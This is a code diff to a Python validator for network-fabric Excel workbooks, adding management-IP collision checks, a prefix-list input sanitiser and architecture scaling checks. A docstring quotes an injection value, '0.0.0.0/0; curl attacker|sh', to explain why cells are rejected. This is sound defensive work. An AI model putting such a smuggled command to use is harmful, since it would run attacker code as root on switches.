+    air_mgmt_subnet = (settings or {}).get('air_mgmt_subnet') or DEFAULT_AIR_MGMT_SUBNET
+    for label, ip_str in air_mgmt_intruders(claims, air_mgmt_subnet):
+        result.error(
+            "Nodes",
+            f"mgmt IP {ip_str} for {label} is inside the air-mgmt subnet "
+            f"({air_mgmt_subnet}), which is reserved for auto-assigned switch "
+            f"eth0 IPs and Air infrastructure (external-dhcp .77, utility .78, "
+            f"bridge SVI .254). A Nodes-tab host here silently collides with a "
+            f"switch eth0. Put the host on an OOB management subnet instead."
+        )
+
+
+_PREFIX_LIST_ID_RE = re.compile(r'^[A-Za-z0-9_-]+$')
+_CIDR_RE = re.compile(r'^\d{1,3}(\.\d{1,3}){3}/\d{1,2}$')
+
+
+def validate_prefix_lists(ws, result):
+    """Validate the 'Prefix lists' sheet (security review #7).
+
+    `pl.id` / `rule.id` / `rule.match` are interpolated into root-executed
+    `nv set router policy prefix-list ...` lines (now `| quote`'d at render
+    time, but this is the input-layer backstop). Enforce a strict charset so a
+    cell like `0.0.0.0/0; curl attacker|sh` is rejected at ingest rather than
+    relying solely on render-time quoting. Mirrors parse_prefix_lists_sheet's
+    column layout (1=List name, 2=Rule id, 3=Match CIDR, 4=Max prefix len).
+    """
+    if ws.max_row < 2:
+        return
+    header_row = 1
+    for r in range(1, min(ws.max_row + 1, 5)):
+        val = ws.cell(row=r, column=1).value
+        if val and str(val).strip().lower() == 'list name':
+            header_row = r
+            break
+    for row in range(header_row + 1, ws.max_row + 1):
+        list_name = ws.cell(row=row, column=1).value
+        if not list_name or not str(list_name).strip():
+            continue
+        list_id = str(list_name).strip()
+        if list_id.lower() == 'list name':
+            continue
+        rule_id = ws.cell(row=row, column=2).value
+        match_val = ws.cell(row=row, column=3).value
+        if not _PREFIX_LIST_ID_RE.match(list_id):
+            result.error("Prefix lists",
+                         f"row {row}: list name {list_id!r} must match "
+                         f"[A-Za-z0-9_-]+ (rendered into a root-executed switch "
+                         f"config — no spaces or shell metacharacters).")
+        if rule_id is not None and str(rule_id).strip():
+            rid = str(rule_id).strip()
+            if not re.fullmatch(r'\d+', rid):
+                result.error("Prefix lists",
+                             f"row {row}: rule id {rid!r} must be a positive integer.")
+        if match_val is not None and str(match_val).strip():
+            mv = str(match_val).strip()
+            # Strip an optional ' le N' / ' ge N' suffix before the CIDR check.
+            core = re.sub(r'\s+(le|ge)\s+\d{1,2}\b', '', mv).strip()
+            if _SHELL_META_RE.search(mv) or not _CIDR_RE.match(core):
+                result.error("Prefix lists",
+                             f"row {row}: match {mv!r} must be a CIDR (e.g. "
+                             f"10.0.0.0/8, optionally with 'le N'/'ge N') — shell "
+                             f"metacharacters are rejected to prevent command "
+                             f"injection.")
+
+
 # ---------------------------------------------------------------------------
 # Main validation
 # ---------------------------------------------------------------------------
@@ -3076,6 +3685,19 @@ def validate_excel(xlsx_path):
         settings = validate_settings(wb['Settings'], result)
     else:
         settings = {}
+
+    # 2b. air_mgmt_subnet is authored on the Air_Only sheet (row "Air Management
+    #     Subnet"), NOT Settings — and that is the value the parser/deploy use
+    #     (excel_parser.parse_air_settings). Surface it into `settings` so the
+    #     mgmt-IP collision gate (8b) honors a customized subnet instead of the
+    #     hardcoded default. Air_Only is authoritative (matches the deploy).
+    if 'Air_Only' in wb.sheetnames:
+        _air_settings = parse_air_settings(wb['Air_Only'])
+        if _air_settings.get('air_mgmt_subnet'):
+            settings['air_mgmt_subnet'] = _air_settings['air_mgmt_subnet']
+        # S9 overlap check, now that the Air_Only-sourced subnet is resolved.
+        _validate_air_mgmt_overlap(settings.get('air_mgmt_subnet'),
+                                   settings.get('mgmt_subnets'), result)
 
     # 3. Nodes
     parsed_nodes = []
@@ -3145,6 +3767,8 @@ def validate_excel(xlsx_path):
         _print_wm_summary("Wire Map", wb['Wire Map'].max_row - 1, wm_ports)
         # 8x breakout convention check — odd base port + adjacent disabled.
         validate_8x_breakout_odd_ports(wb['Wire Map'], result, "Wire Map")
+        print("  Checking switch layout port ranges...")
+        validate_switch_layout_ports(wb, settings, nodes_function_map, result)
 
     # 6. Air_Only
     air_ports = {}
@@ -3182,6 +3806,23 @@ def validate_excel(xlsx_path):
     print("  Checking plane consistency...")
     validate_plane_consistency(wb, parsed_vlans, result)
 
+    # 7b.1 ns_tiers/ew_tiers must match the spine roles actually declared.
+    # roles_present = the canonical category of every switch node on the
+    # Nodes tab (cs / gs-plane* etc. resolve to themselves).
+    # Note: a *bare legacy* `tiers` is intentionally NOT fed into the live
+    # check — many existing workbooks carry a stale `tiers=2` ("legacy
+    # compatibility only") that does not reflect either fabric. Only an
+    # explicit ns_tiers/ew_tiers declaration is validated against the
+    # spine roles present; back-compat seeding of legacy `tiers` is covered
+    # by the unit test on validate_tiers_consistency.
+    print("  Checking ns_tiers/ew_tiers consistency...")
+    roles_present = set(nodes_function_map.values())
+    declared_tiers = {k: settings[k] for k in ('ns_tiers', 'ew_tiers')
+                      if settings.get(k) not in (None, '')}
+    if declared_tiers:
+        for msg in validate_tiers_consistency(declared_tiers, roles_present):
+            result.error("Settings", msg)
+
     # 7c. Loopbacks sheet (optional — only validates structure if present)
     if 'Loopbacks' in wb.sheetnames:
         print("  Checking Loopbacks...")
@@ -3191,6 +3832,18 @@ def validate_excel(xlsx_path):
     if settings or parsed_nodes or parsed_vlans:
         print("  Checking cross-sheet data consistency...")
         validate_cross_sheet_data(settings, parsed_nodes, parsed_vlans, result)
+
+    # 8b. mgmt-IP collision gate — hard fail on duplicate / reserved-octet IPs
+    #     on the flat OOB /24 AND on any Nodes-tab host that strays into the
+    #     air-mgmt /24 (both silently collide → ~60% packet loss / unreachable).
+    if parsed_nodes:
+        print("  Checking mgmt-IP collisions (OOB + air-mgmt planes)...")
+        validate_oob_mgmt_ip_collisions(parsed_nodes, result, settings=settings)
+
+    # 8b. Prefix lists sheet (routed fabrics) — charset/CIDR gate (security review #7)
+    if 'Prefix lists' in wb.sheetnames:
+        print("  Checking Prefix lists...")
+        validate_prefix_lists(wb['Prefix lists'], result)
 
     # 9. Single-tier SU scaling check
     if parsed_nodes:
@@ -3209,13 +3862,22 @@ def validate_excel(xlsx_path):
     return result
 
 
-def validate_single_tier_su(settings, parsed_nodes, result):
-    """Flag deployments that exceed the architecture's single-tier max SU.
+def _node_name_to_su_for_model(name, nodes_per_su, fallback):
+    """Map compute-node names to SU using the active architecture model."""
+    text = str(name or "").strip()
+    match = re.match(r"gpu-(\d+)$", text)
+    if match:
+        return (int(match.group(1)) + int(nodes_per_su) - 1) // int(nodes_per_su)
+    return fallback(text)
 
-    Multi-tier (super-spine, GSL-spine) scaling is documented but not
-    yet implemented in the parser/topology generator. Hitting the max
-    isn't a hard error — operators may know what they're doing — but
-    it should be a clear warning.
+
+def validate_single_tier_su(settings, parsed_nodes, result):
+    """Flag deployments outside the generator-supported architecture model.
+
+    The legacy scale-sample path still uses ``arch_scaling.py``. For the
+    source-derived XLSX generator, the authoritative support matrix is
+    ``scripts/models/<arch>.yaml`` because it can include source rows that
+    are documented but intentionally skipped until templates exist.
     """
     try:
         from arch_scaling import max_single_tier_su, get_tier, node_name_to_su
@@ -3227,50 +3889,96 @@ def validate_single_tier_su(settings, parsed_nodes, result):
     if not arch:
         return
     cap = max_single_tier_su(arch)
-    if cap is None:
-        return  # unknown arch — skip silently
 
-    # Count distinct active SU indices from Nodes tab. node_name_to_su
-    # handles both 'su-NN-node-MM' and 'gpu-NN' naming conventions.
-    # parse_nodes() stores Enabled as a boolean under key 'enabled'.
+    supported_sus = None
+    model_row = None
+    nodes_per_su = 4
+    try:
+        from models import ModelError, available_sus, get_arch_row, load_arch_model
+    except ImportError:
+        ModelError = None
+    else:
+        try:
+            model = load_arch_model(arch)
+            nodes_per_su = int(model.get('nodes_per_su') or nodes_per_su)
+        except ModelError:
+            pass
+        try:
+            supported_sus = available_sus(arch)
+        except ModelError:
+            supported_sus = None
+
+    # Count distinct active SU indices from Nodes tab. The source-derived
+    # models decide how many gpu-NN rows belong to one SU; GB300 B300 uses
+    # four, while GB300 NVL72 uses eighteen.
     active_sus = set()
     for n in parsed_nodes:
         if not n.get('enabled', True):
             continue
-        su = node_name_to_su(n.get('name', ''))
+        su = _node_name_to_su_for_model(n.get('name', ''), nodes_per_su, node_name_to_su)
         if su is not None:
             active_sus.add(su)
     if not active_sus:
         return
 
     su_count = max(active_sus)  # the highest SU index in active rows
-    if su_count > cap:
-        result.error(
-            "Nodes",
-            f"Active SU count ({su_count}) exceeds the single-tier max "
-            f"({cap}) for {arch}. Multi-tier scaling (super-spine / "
-            f"GSL-spine) is not yet supported. Either reduce the active "
-            f"SU count or wait for the multi-tier release.")
-        return
-    tier = get_tier(arch, su_count)
-    if tier:
-        # Warn (not error) if OOB switch count doesn't match the tier.
-        # Use canonical_category so hostname-classified oob-switches
-        # (where Function column is blank but name starts oob-switch-)
-        # are also counted.
-        oob_in_nodes = sum(
-            1 for n in parsed_nodes
-            if n.get('enabled', True)
-            and canonical_category(str(n.get('function', '')),
-                                   str(n.get('name', ''))) == 'oob-switch'
-        )
-        if oob_in_nodes and oob_in_nodes != tier.oob_switches:
-            result.warn(
+    if supported_sus:
+        if su_count not in supported_sus:
+            supported = ", ".join(str(su) for su in supported_sus)
+            result.error(
                 "Nodes",
-                f"Active OOB switch count ({oob_in_nodes}) doesn't match "
-                f"the expected {tier.oob_switches} for {arch} at "
-                f"SU={su_count} ({tier.notes}). Add or remove OOB "
-                f"switches to match the architecture's fan-out table.")
+                f"Active SU count ({su_count}) is not generator-supported "
+                f"for {arch}. Supported generator SUs: {supported}. "
+                f"Source rows that need missing roles/templates must stay "
+                f"documented in the model but skipped by generation.")
+            return
+        try:
+            _, model_row = get_arch_row(arch, su_count)
+        except ModelError:
+            model_row = None
+
+    if supported_sus is None:
+        # Public distribution: the internal generator models aren't present, so
+        # fall back to the largest SU count validated/shipped for this arch
+        # (single- OR multi-tier — the largescale example workbooks live here).
+        from arch_scaling import max_supported_su
+        max_su = max_supported_su(arch)
+        if max_su is None:
+            return  # unknown arch — skip silently
+        if su_count > max_su:
+            result.error(
+                "Nodes",
+                f"Active SU count ({su_count}) exceeds the maximum validated "
+                f"SU ({max_su}) for {arch}. Reduce the active SU count.")
+            return
+
+    # Warn (not error) if OOB switch count doesn't match the source model.
+    # Use canonical_category so hostname-classified oob-switches (where
+    # Function column is blank but name starts oob-switch-) are counted too.
+    oob_in_nodes = sum(
+        1 for n in parsed_nodes
+        if n.get('enabled', True)
+        and canonical_category(str(n.get('function', '')),
+                               str(n.get('name', ''))) == 'oob-switch'
+    )
+    expected_oob = None
+    notes = None
+    if model_row:
+        expected_oob = int(model_row.get("oob", 0) or 0)
+        notes = "source-derived architecture model"
+    else:
+        tier = get_tier(arch, su_count)
+        if tier:
+            expected_oob = tier.oob_switches
+            notes = tier.notes
+
+    if expected_oob and oob_in_nodes and oob_in_nodes != expected_oob:
+        result.warn(
+            "Nodes",
+            f"Active OOB switch count ({oob_in_nodes}) doesn't match "
+            f"the expected {expected_oob} for {arch} at SU={su_count} "
+            f"({notes}). Add or remove OOB switches to match the "
+            f"architecture's fan-out table.")
 
 
 def validate_air_oob_single_cable(ws, parsed_nodes, result):
